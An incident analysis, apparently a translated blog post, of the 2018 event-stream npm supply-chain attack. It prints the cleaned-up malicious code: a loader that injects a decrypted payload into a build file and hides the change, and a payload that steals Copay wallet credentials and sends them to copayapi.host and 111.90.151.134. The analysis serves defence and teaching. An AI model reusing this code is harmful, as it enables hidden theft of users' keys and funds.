> * 原文地址：[Compromised npm Package: event-stream](https://medium.com/intrinsic/compromised-npm-package-event-stream-d47d08605502)
> * 原文作者：[Thomas Hunter II](https://medium.com/@tlhunter?source=post_header_lockup)
> * 译文出自：[掘金翻译计划](https://github.com/xitu/gold-miner)
> * 本文永久链接：[https://github.com/xitu/gold-miner/blob/master/TODO1/compromised-npm-package-event-stream.md](https://github.com/xitu/gold-miner/blob/master/TODO1/compromised-npm-package-event-stream.md)
> * 译者：
> * 校对者：

# Compromised npm Package: event-stream

![](https://cdn-images-1.medium.com/max/800/1*OB_BwZtUSGuM15X6xFsrWw.png)

Ownership of a popular npm package, `[event-stream](https://github.com/dominictarr/event-stream)`, was transferred by the original author to a malicious user, [right9ctrl](https://github.com/right9ctrl). This package receives over [1.5mm](https://www.npmjs.com/package/event-stream) weekly downloads and is depended on by nearly 1,600 other packages. The malicious user was able to gain the trust of the original author by making a series of meaningful contributions to the package. The first publish of this package by the malicious user occurred on September 4th, 2018.

The malicious user modified `event-stream` to then depend on a malicious package, `[flatmap-stream](https://github.com/hugeglass/flatmap-stream)`. This package was specifically crafted for the purposes of this attack. That package contains a fairly simple `index.js` file, as well as a minified `index.min.js` file. The two files on GitHub appear innocent enough. However, in the published npm package, the minified version of the file has additional code injected into it. There is no requirement that code being uploaded in an npm module is equivalent to the code stored publicly in a git repository.

The addition of the malicious package to the list of `event-stream` dependencies came to light on November 20th and is documented heavily in [dominictarr/event-stream#116](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441759047). This issue was made over two months after the compromised package was published. One of the many benefits of open source software is that code can be audited by many different developers. However, this isn’t a silver bullet. An example of this is OpenSSL, which is an open source project receiving some of the highest scrutiny but is still affected by serious vulnerabilities such as Heartbleed.

### What does the package do?

The package represents a highly targeted attack. It ultimately affects an open source app called [bitpay/copay](https://github.com/bitpay/copay). According to their README, _Copay is a secure bitcoin wallet platform for both desktop and mobile devices._ We know the malicious package specifically targets that application because the obfuscated code reads the `description` field from a project’s `package.json` file, then uses that description to decode an **AES256** encrypted payload.

For projects other than copay, the description field won’t properly match the key used for encryption, and the operation fails silently. The [description field for bitpay/copay](https://github.com/bitpay/copay/blob/90336ef9fb4cc3a90a026827be27a32348d3615c/package.json#L3), which is `A Secure Bitcoin Wallet`, is the key required to decrypt this data.

The package `flatmap-stream` contains encoded data cleverly hidden in a `test` directory. This directory _is not_ available in the GitHub repository but _is available_ in the raw `[flatmap-stream-0.1.1.tgz](https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz)` package. The encoded data is stored as an array of parts. Each of these parts are minified/obfuscated and also encrypted to various degrees. Some of the encrypted data includes method names which could alert the malicious behavior to static analysis tools, such as the string `_compile`, which is a method on `require` for creating a new module. I’ve done my best to clean-up the files and make them human readable in the following two code samples.

Here is the first part. It isn’t as interesting and mostly appears to be a bootstrap function to load the second part. It appears to work by modifying a file name `ReedSolomonDecoder.js` from a submodule. If the file has already been modified, which is known to have happened if `/*@@*/` appears in the file, then it does nothing. If it hasn’t been modified it not only modifies the file but also replaces the access and modified timestamps to be the original values. That way if you glance at the file on disk you would not immediately notice it had been modified.

```
/*@@*/
module.exports = function (e) {
  try {
    if (!/build\:.*\-release/.test(process.argv[2])) return;
    var desc = process.env.npm_package_description;
    var fs = require("fs");
    var decoderPath = "./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js";
    var decoderStat = fs.statSync(decoderPath);
    var decoderSource = fs.readFileSync(decoderPath, "utf8");
    var decipher = require("crypto").createDecipher("aes256", desc);
    var s = decipher.update(e, "hex", "utf8");
    s = "\n" + (s += decipher.final("utf8"));
    var a = decoderSource.indexOf("\n/*@@*/");
    if (0 <= a) {
      (decoderSource = decoderSource.substr(0, a));
      fs.writeFileSync(decoderPath, decoderSource + s, "utf8");
      fs.utimesSync(decoderPath, decoderStat.atime, decoderStat.mtime);
      process.on("exit", function () {
        try {
          fs.writeFileSync(decoderPath, decoderSource, "utf8");
          fs.utimesSync(decoderPath, decoderStat.atime, decoderStat.mtime);
        } catch (err) {}
      });
    }
  } catch (err) {}
};
```

And here is the more interesting second part. Some superfluous pieces have been removed to make the original intent more obvious.

```
/*@@*/
function doBadStuff() {
  try {
    const http = require("http");
    const crypto = require("crypto");
    const publicKey = "-----BEGIN PUBLIC KEY-----\n...TRUNCATED...\n-----END PUBLIC KEY-----";

    function sendRequest(hostname, path, body) {
      // Original request "decodes" a hex representation of the hostnames
      // hostname = Buffer.from(hostname, "hex").toString();

      const req = http.request({
        hostname: hostname,
        port: 8080,
        method: "POST",
        path: "/" + path, // path will be /p or /c
        headers: {
          "Content-Length": body.length,
          "Content-Type": "text/html"
        }
      }, function() {});

      req.on("error", function(err) {});

      req.write(body);

      req.end();
    }

    function sendRequests(path, rawStringPayload) {
      // path = "c" || "p"
      let payload = "";
      for (let i = 0; i < rawStringPayload.length; i += 200) {
        const chunk = rawStringPayload.substr(i, 200);
        payload += crypto.publicEncrypt(
          publicKey,
          Buffer.from(chunk, "utf8")
        ).toString("hex") + "+";
      }

      sendRequest("copayapi.host", path, payload);
      sendRequest("111.90.151.134", path, payload);
    }

    function getDataFromStorage(name, callback) {
      if (window.cordova) {
        try {
          const dd = cordova.file.dataDirectory;
          resolveLocalFileSystemURL(dd, function(localFs) {
            localFs.getFile(name, {
              create: false
            }, function(file) {
              file.file(function(contents) {
                const fileReader = new FileReader;
                fileReader.onloadend = function() {
                  return callback(JSON.parse(fileReader.result))
                };
                fileReader.onerror = function(err) {
                  fileReader.abort()
                };
                fileReader.readAsText(contents)
              })
            })
          })
        } catch (err) {}
      } else {
        try {
          const data = localStorage.getItem(name);

          if (data) {
            return callback(JSON.parse(data));
          }

          chrome.storage.local.get(name, function(entry) {
            if (entry) {
              return callback(JSON.parse(entry[name]));
            }
          })
        } catch (err) {}
      }
    }

    global.CSSMap = {};

    getDataFromStorage("profile", function(data) {
      for (let credential in data.credentials) {
        const creds = data.credentials[credential];
        if ("livenet" == creds.network) {
          getDataFromStorage("balanceCache-" + creds.walletId, function(data) {
            const self = this;
            self.balance = parseFloat(data.balance.split(" ")[0]);

            if ("btc" == self.coin && self.balance < 100 || "bch" == self.coin && self.balance < 1000) {
              global.CSSMap[self.xPubKey] = true;
            }

            sendRequests("c", JSON.stringify(self));
          }.bind(creds))
        }
      }
    });

    const Credentials = require("bitcore-wallet-client/lib/credentials.js");
    // Intercept the getKeys function in the Credentails class
    Credentials.prototype.getKeysFunc = Credentials.prototype.getKeys;
    Credentials.prototype.getKeys = function(keyLookup) {
      const originalResult = this.getKeysFunc(keyLookup);
      try {
        if (global.CSSMap && global.CSSMap[this.xPubKey]) {
          delete global.CSSMap[this.xPubKey];
          sendRequests("p", keyLookup + "\t" + this.xPubKey);
        }
      } catch (err) {}

      return originalResult;
    }
  } catch (err) {}
}

// Run as soon as ready
window.cordova
  ? document.addEventListener("deviceready", doBadStuff)
  : doBadStuff()
```

This file monkey-patches functionality from the `bitcore-wallet-client` package, specifically the `getKeys` method of the `Credentials` class. It backs up the original function, then inserts code to transmit the credentials for a wallet to a third party server. That server is located at `111.90.151.134`. These credentials can likely be used to gain access to users accounts and allow an attacker to steal money from the original owner.

The package makes several attempts to avoid detection. For example, it doesn’t run when using a test Bitcoin network, identified as `testnet`. Instead it only runs on the live Bitcoin network, named `livenet`. This could help avoid detection if an affected app runs acceptance tests against the test network. It also only appears to run the bootloader when a release build is being generated. It does so by looking at the first argument in `process.argv` and testing it against the regular expression `/build\:.*\-release/`, and returning if a match isn’t made. This argument is likely provided by some sort of build server.

### How could this attack have been prevented?

It may be tempting to rely on tools which scan npm packages by way of static analysis. This particular attack encrypts the malicious source code to avoid detection. To protect against such an attack a different approach must be taken…

This particular attack appears to run in both a normal webpage as well as an application built with Cordova — a tool for converting web apps into mobile apps. The attack could have been prevented by making use of [CSP (Content Security Policy)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP). This is a standard for specifying which URLs a webpage can communicate with and is specified via web server headers. Cordova even has its own [mechanism](https://cordova.apache.org/docs/en/latest/reference/cordova-plugin-whitelist/index.html#navigation-whitelist) for specifying which third party services can be contacted. However, the [Copay application appears to have disabled this feature](https://github.com/bitpay/copay/blob/72a9e176c12c77b5dfc4590c88de73f28fa301b7/app-template/config-template.xml#L121).

CSP is a great tool for securing frontend applications. However, such a feature is not built into Node.js itself. [Intrinsic](https://intrinsic.com/) is a Node.js package which provides the ability to whitelist which URLs an application can communicate with— much like CSP—however it can do much more powerful things as well. Intrinsic can be used to whitelist filesystem access, child process access, sensitive `process` attributes, TCP and UDP connections, and even fine-grained database access. These whitelists are specified on a per-route basis, making Intrinsic far more powerful than a firewall.

Interestingly, this attack on `event-stream`, wherein the attacker monkey-patches a sensitive function with a malicious one which makes outbound HTTP requests to an evil server, is _exactly_ what we warned against in our previous post: [The Dangers of Malicious Modules](https://medium.com/intrinsic/common-node-js-attack-vectors-the-dangers-of-malicious-modules-863ae949e7e8). These supply-chain attacks are only going to become more and more prevalent with time. Targeted attacks, like how this package specifically targets the Copay application, will also become more prevalent.

> 如果发现译文存在错误或其他需要改进的地方，欢迎到 [掘金翻译计划](https://github.com/xitu/gold-miner) 对译文进行修改并 PR，也可获得相应奖励积分。文章开头的 **本文永久链接** 即为本文在 GitHub 上的 MarkDown 链接。


---

> [掘金翻译计划](https://github.com/xitu/gold-miner) 是一个翻译优质互联网技术文章的社区，文章来源为 [掘金](https://juejin.im) 上的英文分享文章。内容覆盖 [Android](https://github.com/xitu/gold-miner#android)、[iOS](https://github.com/xitu/gold-miner#ios)、[前端](https://github.com/xitu/gold-miner#前端)、[后端](https://github.com/xitu/gold-miner#后端)、[区块链](https://github.com/xitu/gold-miner#区块链)、[产品](https://github.com/xitu/gold-miner#产品)、[设计](https://github.com/xitu/gold-miner#设计)、[人工智能](https://github.com/xitu/gold-miner#人工智能)等领域，想要查看更多优质译文请持续关注 [掘金翻译计划](https://github.com/xitu/gold-miner)、[官方微博](http://weibo.com/juejinfanyi)、[知乎专栏](https://zhuanlan.zhihu.com/juejinfanyi)。
